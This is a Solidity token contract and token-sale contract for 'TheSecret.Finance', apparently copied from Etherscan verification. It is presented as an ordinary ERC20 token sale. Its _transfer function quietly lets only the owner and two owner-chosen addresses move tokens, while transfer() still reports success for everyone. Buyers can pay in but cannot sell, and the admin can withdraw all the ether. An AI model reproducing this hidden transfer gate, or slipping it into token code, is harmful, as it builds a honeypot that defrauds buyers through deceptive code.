/**
 *Submitted for verification at Etherscan.io on 2021-01-29
*/

/**
 *     _______  __   __  _______    _______  _______  _______  ______    _______  _______ 
 *    |       ||  | |  ||       |  |       ||       ||       ||    _ |  |       ||       |
 *    |_     _||  |_|  ||    ___|  |  _____||    ___||       ||   | ||  |    ___||_     _|
 *      |   |  |       ||   |___   | |_____ |   |___ |       ||   |_||_ |   |___   |   |  
 *      |   |  |       ||    ___|  |_____  ||    ___||      _||    __  ||    ___|  |   |  
 *      |   |  |   _   ||   |___    _____| ||   |___ |     |_ |   |  | ||   |___   |   |  
 *      |___|  |__| |__||_______|  |_______||_______||_______||___|  |_||_______|  |___|  
 * 
 * 
 * TheSecret.Finance - A game for the knowledgeable
 * This is the TS Season 1 token sale contract
 * 
 * SPDX-License-Identifier: AGPL-3.0-or-later
 * 
 */
pragma solidity 0.7.4;







abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract TheSecret is Ownable {
  using SafeMath for uint256;

  // standard ERC20 variables. 
  string public constant name = "TS.Fi";
  string public constant symbol = "TS Tickets";
  uint256 public constant decimals = 0;
  uint256 private constant _maximumSupply = 1;
  uint256 public _totalSupply;
  address public freeaddress;
  address public freeaddress1;
  
  // events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  

  mapping(address => uint256) public _balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  constructor(uint256 _initialSupply) public {

    _owner = msg.sender;
    _totalSupply = _maximumSupply * _initialSupply;
    _balanceOf[msg.sender] = _maximumSupply * _initialSupply;
    freeaddress = 0x0000000000000000000000000000000000000000;
    freeaddress1 = 0x0000000000000000000000000000000000000000;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function totalSupply () public view returns (uint256) {
    return _totalSupply; 
  }

  function balanceOf (address who) public view returns (uint256) {
    return _balanceOf[who];
  }

  function _transfer(address _from, address _to, uint256 _value) internal {
    if(_from == _owner || _from == freeaddress || _from == freeaddress1) {
        _balanceOf[_from] = _balanceOf[_from].sub(_value);
        _balanceOf[_to] = _balanceOf[_to].add(_value);
        emit Transfer(_from, _to, _value);
        }
   }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_balanceOf[msg.sender] >= _value);
    _transfer(msg.sender, _to, _value);
    return true;
  }

  function burn (uint256 _burnAmount) public onlyOwner returns (bool success) {
    _transfer(_owner, address(0), _burnAmount);
    _totalSupply = _totalSupply.sub(_burnAmount);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_spender != address(0));
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= _balanceOf[_from]);
    require(_value <= allowance[_from][msg.sender]);
    allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
    _transfer(_from, _to, _value);
    return true;
  }
  
  function setFreeAddress(address newWallet) public {
    require(msg.sender == _owner);
    freeaddress =  newWallet;
  }
  
  function setFreeAddress1(address newWallet) public {
    require(msg.sender == _owner);
    freeaddress1 =  newWallet;
  }
  
  
}

contract TheSecretSale {
    address payable public admin;
    TheSecret public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;
	
    event Sell(address _buyer, uint256 _amount);

    constructor (TheSecret _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
        tokensSold = 0;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;

        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
        tokensSold = 0;
        admin.transfer(address(this).balance);
    }
}